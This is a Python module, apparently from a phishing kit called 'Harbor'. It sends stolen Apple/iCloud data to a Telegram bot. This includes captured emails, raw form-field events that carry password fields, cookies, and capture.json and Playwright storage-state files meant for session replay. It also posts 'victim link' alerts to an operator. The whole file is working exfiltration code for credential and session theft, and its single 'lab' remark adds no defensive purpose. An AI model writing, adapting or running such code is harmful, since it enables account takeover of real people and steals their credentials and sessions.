"""Forward mirror capture artifacts to a Telegram bot (optional via env)."""

from __future__ import annotations

import json
import os
import queue
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).parent
_ENV_LOADED = False
_SEND_QUEUE: queue.Queue | None = None
_WORKER_STARTED = False
_LAST_FIELD_NOTIFY = 0.0
_FIELD_NOTIFY_MIN_INTERVAL = 4.0
_QUEUE_MAX = 48


def _load_env_file() -> None:
    global _ENV_LOADED
    if _ENV_LOADED:
        return
    _ENV_LOADED = True
    for name in ('.env', 'telegram.env'):
        path = ROOT / name
        if not path.is_file():
            continue
        for line in path.read_text(encoding='utf-8').splitlines():
            line = line.strip()
            if not line or line.startswith('#') or '=' not in line:
                continue
            key, val = line.split('=', 1)
            key = key.strip()
            val = val.strip().strip('"').strip("'")
            if key and key not in os.environ:
                os.environ[key] = val


def _config() -> tuple[str, str] | None:
    _load_env_file()
    token = (os.environ.get('TELEGRAM_BOT_TOKEN') or '').strip()
    chat_id = (os.environ.get('TELEGRAM_CHAT_ID') or '').strip()
    if not token or not chat_id:
        return None
    return token, chat_id


def _post_form(token: str, method: str, fields: dict) -> bool:
    data = urllib.parse.urlencode(fields).encode('utf-8')
    req = urllib.request.Request(
        f'https://api.telegram.org/bot{token}/{method}',
        data=data,
        method='POST',
    )
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            body = json.loads(resp.read().decode('utf-8'))
            return bool(body.get('ok'))
    except (urllib.error.URLError, urllib.error.HTTPError, json.JSONDecodeError, TimeoutError):
        return False


def _post_multipart(token: str, method: str, fields: dict, file_field: str, file_path: Path) -> bool:
    boundary = '----HarborCaptureBoundary7MA4YWxkTrZu0gW'
    parts: list[bytes] = []

    def add_field(name: str, value: str) -> None:
        parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode(
                'utf-8'
            )
        )

    for name, value in fields.items():
        add_field(name, str(value))

    raw = file_path.read_bytes()
    filename = file_path.name
    parts.append(
        (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="{file_field}"; filename="{filename}"\r\n'
            f'Content-Type: application/octet-stream\r\n\r\n'
        ).encode('utf-8')
    )
    parts.append(raw)
    parts.append(f'\r\n--{boundary}--\r\n'.encode('utf-8'))
    body = b''.join(parts)

    req = urllib.request.Request(
        f'https://api.telegram.org/bot{token}/{method}',
        data=body,
        method='POST',
        headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            payload = json.loads(resp.read().decode('utf-8'))
            return bool(payload.get('ok'))
    except (urllib.error.URLError, urllib.error.HTTPError, json.JSONDecodeError, TimeoutError, OSError):
        return False


def _send_text_sync(text: str) -> bool:
    cfg = _config()
    if not cfg:
        return False
    token, chat_id = cfg
    return _post_form(token, 'sendMessage', {'chat_id': chat_id, 'text': text[:4096]})


def _send_document_sync(path: Path, caption: str = '') -> bool:
    cfg = _config()
    if not cfg or not path.is_file():
        return False
    token, chat_id = cfg
    fields = {'chat_id': chat_id}
    if caption:
        fields['caption'] = caption[:1024]
    return _post_multipart(token, 'sendDocument', fields, 'document', path)


def _worker() -> None:
    assert _SEND_QUEUE is not None
    while True:
        job = _SEND_QUEUE.get()
        if job is None:
            break
        kind = job[0]
        try:
            if kind == 'text':
                _send_text_sync(job[1])
            elif kind == 'document':
                _send_document_sync(job[1], job[2] if len(job) > 2 else '')
            elif kind == 'session':
                if len(job) > 4:
                    _notify_session_sync(job[1], job[2], job[3], job[4])
                else:
                    _notify_session_sync(job[1], job[2], job[3])
            elif kind == 'page':
                _notify_page_sync(job[1])
            elif kind == 'fields':
                _notify_field_events_sync(job[1])
        except Exception as exc:
            print(f'[telegram] worker error: {exc}', flush=True)
        finally:
            _SEND_QUEUE.task_done()


def _ensure_worker() -> None:
    global _SEND_QUEUE, _WORKER_STARTED
    if not _config():
        return
    if _WORKER_STARTED:
        return
    _SEND_QUEUE = queue.Queue(maxsize=_QUEUE_MAX)
    threading.Thread(target=_worker, daemon=True, name='telegram-capture').start()
    _WORKER_STARTED = True


def _enqueue(job: tuple) -> None:
    _ensure_worker()
    if _SEND_QUEUE is None:
        return
    try:
        _SEND_QUEUE.put_nowait(job)
    except queue.Full:
        try:
            _SEND_QUEUE.get_nowait()
            _SEND_QUEUE.task_done()
        except queue.Empty:
            pass
        try:
            _SEND_QUEUE.put_nowait(job)
        except queue.Full:
            pass


def _notify_session_sync(out_dir: Path, credentials: dict, cookies: list, meta: dict | None = None) -> None:
    email = credentials.get('email') or '-'
    pw = credentials.get('password') or ''
    pw_display = ('*' * len(pw)) if pw else '-'
    session = (meta or {}).get('session') or {}
    lines = [
        'Harbor capture — session',
        f'Email: {email}',
        f'Password: {pw_display}',
        f'Cookies: {len(cookies)} apple.com/icloud.com',
        f"Session score: {session.get('score', '?')} logged_in={session.get('likely_logged_in', False)}",
    ]
    replay = session.get('replay_hint')
    if replay:
        lines.append(replay)
    _send_text_sync('\n'.join(lines))
    capture_path = out_dir / 'capture.json'
    if capture_path.is_file():
        _send_document_sync(capture_path, caption='capture.json')
    state_path = out_dir / 'storage-state.json'
    if state_path.is_file():
        _send_document_sync(state_path, caption='storage-state.json (Playwright import)')


def _notify_page_sync(path: Path) -> None:
    _send_text_sync(f'Harbor capture — new Apple page\n{path.name}')
    _send_document_sync(path, caption=path.name)


def _notify_field_events_sync(events: list) -> None:
    if not events:
        return
    compact = []
    for ev in events[-5:]:
        compact.append(
            {
                'side': ev.get('side'),
                'url': ev.get('url'),
                'fields': ev.get('fields'),
                'cookies': ev.get('cookies'),
                'contextCookieCount': len(ev.get('contextCookies') or []),
            }
        )
    payload = json.dumps(compact, ensure_ascii=False, indent=2)
    if len(payload) > 3500:
        payload = payload[:3500] + '\n…'
    _send_text_sync(f'Harbor capture — field events ({len(events)})\n{payload}')


def send_text(text: str) -> bool:
    if not _config():
        return False
    _enqueue(('text', text[:4096]))
    return True


def notify_session_capture(out_dir: Path, credentials: dict, cookies: list, meta: dict | None = None) -> None:
    _enqueue(('session', out_dir, credentials, cookies, meta or {}))


def notify_new_page(path: Path) -> None:
    _enqueue(('page', path))


def notify_lab_event(message: str) -> None:
    """Immediate operator alert (full lab text — not for production drops)."""
    if not _config():
        return
    _enqueue(('text', message[:4096]))


def notify_victim_link(link: str, *, session: str = 'op1') -> None:
    if not _config() or not (link or '').strip():
        return
    text = (
        'Harbor — victim link\n\n'
        f'{link.strip()}\n\n'
        f'Session: {session}\n'
        'Tunnel restarts change fwd= — use the latest link after harbor-go-remote.'
    )
    _enqueue(('text', text[:4096]))


def notify_field_events(events: list) -> None:
    global _LAST_FIELD_NOTIFY
    if not events:
        return
    interesting = False
    for ev in events:
        fields = ev.get('fields') or {}
        acct = fields.get('account_name_text_field') or fields.get('accountName') or ''
        if isinstance(acct, str) and ('@' in acct or len(acct.strip()) >= 5):
            interesting = True
            break
        if fields.get('password_text_field') or fields.get('password'):
            interesting = True
            break
    if not interesting:
        return
    now = time.monotonic()
    if now - _LAST_FIELD_NOTIFY < _FIELD_NOTIFY_MIN_INTERVAL:
        return
    _LAST_FIELD_NOTIFY = now
    _enqueue(('fields', events[-8:]))
